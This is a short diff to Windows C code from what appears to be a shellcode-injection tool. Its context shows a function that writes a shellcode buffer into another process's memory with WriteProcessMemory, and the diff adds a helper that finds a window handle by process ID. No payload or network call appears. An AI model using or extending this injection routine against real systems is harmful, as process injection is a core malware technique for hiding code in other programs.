@@ -102,4 +102,32 @@ LPVOID InjectShellcode(HANDLE hProcess, UINT8 *buf, UINT64 bufsize)
     WriteProcessMemory(hProcess, remotePayloadMemory, buf, bufsize, NULL);
     return remotePayloadMemory;
 }
+
+static HWND targetHwnd = NULL;
+static DWORD targetPID = 0;
+
+static BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam)
+{
+    targetHwnd = NULL;
+
+    DWORD currentPID;
+    GetWindowThreadProcessId(hwnd, &currentPID);
+
+    if (currentPID == targetPID)
+    {
+        // We found a window that belongs to the target process
+        targetHwnd = hwnd;
+        return FALSE; // Stop enumeration
+    }
+    
+    return TRUE; // Continue enumeration
+}
+
+HWND GetTargetWindowHandleByPID(DWORD processId)
+{
+    targetPID = processId;
+    EnumWindows(EnumWindowsCallback, 0);
+    return targetHwnd;
+}
+
 }
